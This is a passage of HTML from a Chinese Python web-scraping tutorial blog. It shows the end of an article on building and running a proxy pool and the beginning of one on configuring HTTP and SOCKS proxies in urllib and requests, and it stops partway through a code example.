class="string">f'starting tester, pid <span class="subst">&#123;tester_process.pid&#125;</span>...'</span>)</span><br><span class="line">                tester_process.start()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ENABLE_GETTER:</span><br><span class="line">                getter_process = multiprocessing.Process(target=self.run_getter)</span><br><span class="line">                logger.info(<span class="string">f'starting getter, pid<span class="subst">&#123;getter_process.pid&#125;</span>...'</span>)</span><br><span class="line">                getter_process.start()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ENABLE_SERVER:</span><br><span class="line">                server_process = multiprocessing.Process(target=self.run_server)</span><br><span class="line">                logger.info(<span class="string">f'starting server, pid<span class="subst">&#123;server_process.pid&#125;</span>...'</span>)</span><br><span class="line">                server_process.start()</span><br><span class="line"></span><br><span class="line">            tester_process.join()</span><br><span class="line">            getter_process.join()</span><br><span class="line">            server_process.join()</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            logger.info(<span class="string">'received keyboard interrupt signal'</span>)</span><br><span class="line">            tester_process.terminate()</span><br><span class="line">            getter_process.terminate()</span><br><span class="line">            server_process.terminate()</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="comment"># must call join method before calling is_alive</span></span><br><span class="line">            tester_process.join()</span><br><span class="line">            getter_process.join()</span><br><span class="line">            server_process.join()</span><br><span class="line">            logger.info(<span class="string">f'tester is <span class="subst">&#123;<span class="string">"alive"</span> <span class="keyword">if</span> tester_process.is_alive() <span class="keyword">else</span> <span class="string">"dead"</span>&#125;</span>'</span>)</span><br><span class="line">            logger.info(<span class="string">f'getter is <span class="subst">&#123;<span class="string">"alive"</span> <span class="keyword">if</span> getter_process.is_alive() <span class="keyword">else</span> <span class="string">"dead"</span>&#125;</span>'</span>)</span><br><span class="line">            logger.info(<span class="string">f'server is <span class="subst">&#123;<span class="string">"alive"</span> <span class="keyword">if</span> server_process.is_alive() <span class="keyword">else</span> <span class="string">"dead"</span>&#125;</span>'</span>)</span><br><span class="line">            logger.info(<span class="string">'proxy terminated'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    scheduler = Scheduler()</span><br><span class="line">    scheduler.run()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>3 个常量 <code>ENABLE_TESTER</code>、<code>ENABLE_GETTER</code> 和 <code>ENABLE_SERVER</code> 都是布尔类型，表示测试模块、获取模块和接口模块的开关，如果都为 <code>True</code>，则代表模块开启。</p>
                  <p>启动入口是 <code>run</code> 方法，这个方法分别判断 3 个模块的开关。如果开关开启，启动时程序就新建一个 Process 进程，设置好启动目标，然后调用 <code>start</code> 方法运行，这样 3 个进程就可以并行执行，互不干扰。</p>
                  <p>3 个调度方法的结构也非常清晰。比如，<code>run_tester</code> 方法用来调度测试模块。首先声明一个 Tester 对象，然后进入死循环不断循环调用其 <code>run</code> 方法，执行完一轮之后就休眠一段时间，休眠结束之后重新再执行。这里休眠时间也定义为一个常量，如 20 秒，即每隔 20 秒进行一次代理检测。</p>
                  <p>最后，只需要调用 <code>Scheduler</code> 的 <code>run</code> 方法即可启动整个代理池。</p>
                  <p>以上内容便是整个代理池的架构和相应实现逻辑。</p>
                  <h2 id="5-运行"><a href="#5-运行" class="headerlink" title="5.运行"></a>5.运行</h2>
                  <p>接下来，我们将代码整合一下，将代理运行起来，运行之后的输出结果如下所示：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">06.510</span> | INFO     | proxypool.storages.redis:decrease:<span class="number">73</span> - <span class="number">60.186</span><span class="number">.146</span><span class="number">.193</span>:<span class="number">9000</span> current score <span class="number">10.0</span>, decrease <span class="number">1</span></span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">06.517</span> | DEBUG    | proxypool.processors.tester:test:<span class="number">52</span> - proxy <span class="number">60.186</span><span class="number">.146</span><span class="number">.193</span>:<span class="number">9000</span> <span class="keyword">is</span> invalid, decrease score</span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">06.524</span> | INFO     | proxypool.storages.redis:decrease:<span class="number">73</span> - <span class="number">60.186</span><span class="number">.151</span><span class="number">.147</span>:<span class="number">9000</span> current score <span class="number">10.0</span>, decrease <span class="number">1</span></span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">06.532</span> | DEBUG    | proxypool.processors.tester:test:<span class="number">52</span> - proxy <span class="number">60.186</span><span class="number">.151</span><span class="number">.147</span>:<span class="number">9000</span> <span class="keyword">is</span> invalid, decrease score</span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">07.159</span> | INFO     | proxypool.storages.redis:max:<span class="number">96</span> - <span class="number">60.191</span><span class="number">.11</span><span class="number">.246</span>:<span class="number">3128</span> <span class="keyword">is</span> valid, set to <span class="number">100</span></span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">07.167</span> | DEBUG    | proxypool.processors.tester:test:<span class="number">46</span> - proxy <span class="number">60.191</span><span class="number">.11</span><span class="number">.246</span>:<span class="number">3128</span> <span class="keyword">is</span> valid, set max score</span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">17.271</span> | INFO     | proxypool.storages.redis:decrease:<span class="number">73</span> - <span class="number">59.62</span><span class="number">.7</span><span class="number">.130</span>:<span class="number">9000</span> current score <span class="number">10.0</span>, decrease <span class="number">1</span></span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">17.280</span> | DEBUG    | proxypool.processors.tester:test:<span class="number">52</span> - proxy <span class="number">59.62</span><span class="number">.7</span><span class="number">.130</span>:<span class="number">9000</span> <span class="keyword">is</span> invalid, decrease score</span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">17.288</span> | INFO     | proxypool.storages.redis:decrease:<span class="number">73</span> - <span class="number">60.167</span><span class="number">.103</span><span class="number">.74</span>:<span class="number">1133</span> current score <span class="number">10.0</span>, decrease <span class="number">1</span></span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">17.295</span> | DEBUG    | proxypool.processors.tester:test:<span class="number">52</span> - proxy <span class="number">60.167</span><span class="number">.103</span><span class="number">.74</span>:<span class="number">1133</span> <span class="keyword">is</span> invalid, decrease score</span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">17.302</span> | INFO     | proxypool.storages.redis:decrease:<span class="number">73</span> - <span class="number">60.162</span><span class="number">.71</span><span class="number">.113</span>:<span class="number">9000</span> current score <span class="number">10.0</span>, decrease <span class="number">1</span></span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-13</span> <span class="number">02</span>:<span class="number">52</span>:<span class="number">17.309</span> | DEBUG    | proxypool.processors.tester:test:<span class="number">52</span> - proxy <span class="number">60.162</span><span class="number">.71</span><span class="number">.113</span>:<span class="number">9000</span> <span class="keyword">is</span> invalid, decrease score</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>以上是代理池的控制台输出，可以看到这里将可用代理设置为 100，不可用代理分数减 1。</p>
                  <p>接下来，我们再打开浏览器，当前配置运行在 5555 端口，所以打开 <a href="http://127.0.0.1:5555" target="_blank" rel="noopener">http://127.0.0.1:5555</a> 即可看到其首页，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/pxwew.png" alt="image-20210711001154883"><br>图 9-2 首页</p>
                  <p>再访问 <a href="http://127.0.0.1:5555/random" target="_blank" rel="noopener">http://127.0.0.1:5555/random</a>，即可获取随机可用代理，如图 9-3 所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/31i7g.jpg" alt=""><br>图 9-3 获取随机可用代理</p>
                  <p>只需要访问此接口，即可获取一个随机可用代理，这非常方便。</p>
                  <p>获取代理的代码如下所示：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">PROXY_POOL_URL = <span class="string">'http://localhost:5555/random'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_proxy</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(PROXY_POOL_URL)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span> ConnectionError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样便可以获取到一个随机代理了。它是字符串类型，此代理可以按照上一节所示的方法设置，如 requests 的使用方法如下所示：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxy = get_proxy()</span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">'http'</span>: <span class="string">'http://'</span> + proxy,</span><br><span class="line">    <span class="string">'https'</span>: <span class="string">'https://'</span> + proxy,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">'http://httpbin.org/get'</span>, proxies=proxies)</span><br><span class="line">    print(response.text)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">'Error'</span>, e.args)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>有了代理池之后，再取出代理即可有效防止 IP 被封禁的情况。</p>
                  <h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2>
                  <p>本节我们学习了一个代理池的设计思路和实现方案，有了这个代理池，我们就可以实时获取一些可用的代理了。相对之前的实战案例来说，整个代理池的代码量和逻辑复杂了比较多，建议可以好好理解和消化一下。</p>
                  <p>本节的代码地址为 <a href="https://github.com/Python3WebSpider/ProxyPool" target="_blank" rel="noopener">https://github.com/Python3WebSpider/ProxyPool</a>，代码库中还提供了基于 Docker 和 Kubernetes 的运行和部署操作，可以帮助我们更加快捷地运行代理池，同时本书后文也会介绍代理池的部署方法。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-03-04 13:11:13" itemprop="dateCreated datePublished" datetime="2022-03-04T13:11:13+08:00">2022-03-04</time>
                </span>
                <span id="/2022103.html" class="post-meta-item leancloud_visitors" data-flag-title="【2022 年】Python3 爬虫教程 - 高效代理池的维护" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>20k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>18 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/2022102.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/2022102.html" class="post-title-link" itemprop="url">【2022 年】Python3 爬虫教程 - 代理的使用方法</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <blockquote>
                    <p>爬虫系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">《Python3 网络爬虫开发实战（第二版）》</a>一书了，<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">点击了解详情</a>。</p>
                  </blockquote>
                  <p>前面我们介绍了多种请求库，如 urllib、requests、Selenium、Playwright 等用法，但是没有统一梳理代理的设置方法，本节我们来针对这些库来梳理下代理的设置方法。</p>
                  <h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. 准备工作</h2>
                  <p>在本节开始之前，请先根据上一节了解一下代理的基本原理，了解了基本原理之后我们可以更好地理解和学习本节的内容。</p>
                  <p>另外我们需要先获取一个可用代理，代理就是 IP 地址和端口的组合，就是 <code>&lt;ip&gt;:&lt;port&gt;</code> 这样的格式。如果代理需要访问认证，那就还需要额外的用户名密码两个信息。</p>
                  <p>那怎么获取一个可用代理呢？</p>
                  <p>使用搜索引擎搜索 “代理” 关键字，可以看到许多代理服务网站，网站上会有很多免费或付费代理，比如快代理的免费 HTTP 代理：<a href="https://www.kuaidaili.com/free/" target="_blank" rel="noopener">https://www.kuaidaili.com/free/</a> 上面就写了很多免费代理，但是这些免费代理大多数情况下并不一定稳定，所以比较靠谱的方法是购买付费代理。付费代理的各大代理商家都有套餐，数量不用多，稳定可用即可，我们可以自行选购。</p>
                  <p>另外除了购买付费 HTTP 代理，我们也可以在本机配置一些代理软件，具体的配置方法可以参考 <a href="https://setup.scrape.center/proxy-client，软件运行之后会在本机创建" target="_blank" rel="noopener">https://setup.scrape.center/proxy-client，软件运行之后会在本机创建</a> HTTP 或 SOCKS 代理服务，所以代理地址一般都是 <code>127.0.0.1:&lt;port&gt;</code> 这样的格式，不同的软件用的端口可能不同。</p>
                  <p>这里我的本机安装了一部代理软件，它会在本地 7890 端口上创建 HTTP 代理服务，即代理为 127.0.0.1:7890。另外，该软件还会在 7891 端口上创建 SOCKS 代理服务，即代理为 127.0.0.1:7891，所以只要设置了这个代理，就可以成功将本机 IP 切换到代理软件连接的服务器的 IP 了。</p>
                  <p>在本章下面的示例里，我使用上述代理来演示其设置方法，你也可以自行替换成自己的可用代理。</p>
                  <p>设置代理后，测试的网址是 <a href="http://httpbin.org/get" target="_blank" rel="noopener">http://httpbin.org/get</a>，访问该链接我们可以得到请求的相关信息，其中返回结果的 <code>origin</code> 字段就是客户端的 IP，我们可以根据它来判断代理是否设置成功，即是否成功伪装了 IP。</p>
                  <p>好，接下来我们就来看下各个请求库的代理设置方法吧。</p>
                  <h2 id="2-urllib"><a href="#2-urllib" class="headerlink" title="2. urllib"></a>2. urllib</h2>
                  <p>首先我们以最基础的 urllib 为例，来看一下代理的设置方法，代码如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> ProxyHandler, build_opener</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'127.0.0.1:7890'</span></span><br><span class="line">proxy_handler = ProxyHandler(&#123;</span><br><span class="line">    <span class="string">'http'</span>: <span class="string">'http://'</span> + proxy,</span><br><span class="line">    <span class="string">'https'</span>: <span class="string">'http://'</span> + proxy</span><br><span class="line">&#125;)</span><br><span class="line">opener = build_opener(proxy_handler)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = opener.open(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(response.read().decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">"headers"</span>: &#123;</span><br><span class="line">    <span class="attr">"Accept-Encoding"</span>: <span class="string">"identity"</span>,</span><br><span class="line">    <span class="attr">"Host"</span>: <span class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="attr">"User-Agent"</span>: <span class="string">"Python-urllib/3.7"</span>,</span><br><span class="line">    <span class="attr">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-60e9a1b6-0a20b8a678844a0b2ab4e889"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"origin"</span>: <span class="string">"210.173.1.204"</span>,</span><br><span class="line">  <span class="attr">"url"</span>: <span class="string">"https://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们需要借助 ProxyHandler 设置代理，参数是字典类型，键名为协议类型，键值是代理。注意，此处代理前面需要加上协议，即 <code>http://</code> 或者 <code>https://</code>，当请求的链接是 HTTP 协议的时候，会使用 http 键名对应的代理，当请求的链接是 HTTPS 协议的时候，会使用 https 键名对应的代理。不过这里我们把代理本身设置为了 HTTP 协议，即前缀统一设置为了 <code>http://</code>，所以不论访问 HTTP 还是 HTTPS 协议的链接，都会使用我们配置的 HTTP 协议的代理进行请求。</p>
                  <p>创建完 ProxyHandler 对象之后，我们需要利用 build_opener 方法传入该对象来创建一个 Opener，这样就相当于此 Opener 已经设置好代理了。接下来直接调用 Opener 对象的 open 方法，即可访问我们所想要的链接。</p>
                  <p>运行输出结果是一个 JSON，它有一个字段 origin，标明了客户端的 IP。验证一下，此处的 IP 确实为代理的 IP，并不是真实的 IP。这样我们就成功设置好代理，并可以隐藏真实 IP 了。</p>
                  <p>如果遇到需要认证的代理，我们可以用如下的方法设置：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> ProxyHandler, build_opener</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'username:password@127.0.0.1:7890'</span></span><br><span class="line">proxy_handler = ProxyHandler(&#123;</span><br><span class="line">    <span class="string">'http'</span>: <span class="string">'http://'</span> + proxy,</span><br><span class="line">    <span class="string">'https'</span>: <span class="string">'http://'</span> + proxy</span><br><span class="line">&#125;)</span><br><span class="line">opener = build_opener(proxy_handler)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = opener.open(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(response.read().decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里改变的只是 proxy 变量，只需要在代理前面加入代理认证的用户名密码即可，其中 username 就是用户名，password 为密码，例如 username 为 foo，密码为 bar，那么代理就是 <code>foo:bar@127.0.0.1:7890</code>。</p>
                  <p>如果代理是 SOCKS5 类型，那么可以用如下方式设置代理：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> socks</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line"></span><br><span class="line">socks.set_default_proxy(socks.SOCKS5, <span class="string">'127.0.0.1'</span>, <span class="number">7891</span>)</span><br><span class="line">socket.socket = socks.socksocket</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = request.urlopen(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(response.read().decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>此处需要一个 socks 模块，可以通过如下命令安装：</p>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">pip3 <span class="keyword">install</span> PySocks</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里需要本地运行一个 SOCKS5 代理，运行在 7891 端口，运行成功之后和上文 HTTP 代理输出结果是一样的：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">"headers"</span>: &#123;</span><br><span class="line">    <span class="attr">"Accept-Encoding"</span>: <span class="string">"identity"</span>,</span><br><span class="line">    <span class="attr">"Host"</span>: <span class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="attr">"User-Agent"</span>: <span class="string">"Python-urllib/3.7"</span>,</span><br><span class="line">    <span class="attr">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-60e9a1b6-0a20b8a678844a0b2ab4e889"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"origin"</span>: <span class="string">"210.173.1.204"</span>,</span><br><span class="line">  <span class="attr">"url"</span>: <span class="string">"https://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>结果的 origin 字段同样为代理的 IP，代理设置成功。</p>
                  <h2 id="3-requests-的代理设置"><a href="#3-requests-的代理设置" class="headerlink" title="3.requests 的代理设置"></a>3.requests 的代理设置</h2>
                  <p>对于 requests 来说，代理设置非常简单，我们只需要传入 <code>proxies</code> 参数即可。</p>
                  <p>这里以我本机的代理为例，来看下 requests 的 HTTP 代理设置，代码如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'127.0.0.1:7890'</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">'http'</span>: <span class="string">'http://'</span> + proxy,</span><br><span class="line">    <span class="string">'https'</span>: <span class="string">'http://'</span> + proxy,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">'https://httpbin.org/get'</span>, proxies=proxies)</span><br><span class="line">    print(response.text)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">'Error'</span>, e.args)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="string">"headers"</span>: &#123;</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"*/*"</span>,</span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"python-requests/2.22.0"</span>,</span><br><span class="line">    <span class="string">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-5e8f358d-87913f68a192fb9f87aa0323"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"origin"</span>: <span class="string">"210.173.1.204"</span>,</span><br><span class="line">  <span class="string">"url"</span>: <span class="string">"https://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>和 urllib 一样，当请求的链接是 HTTP 协议的时候，会使用 http 键名对应的代理，当请求的链接是 HTTPS 协议的时候，会使用 https 键名对应的代理，不过这里统一使用了 HTTP 协议的代理。</p>
                  <p>运行结果中的 <code>origin</code> 若是代理服务器的 IP，则证明代理已经设置成功。</p>
                  <p>如果代理需要认证，那么在代理的前面加上用户名和密码即可，代理的写法就变成如下所示：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">proxy = <span class="string">'username:password@127.0.0.1:7890'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里只需要将 <code>username</code> 和 <code>password</code> 替换即可。</p>
                  <p>如果需要使用 SOCKS 代理，则可以使用如下方式来设置：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
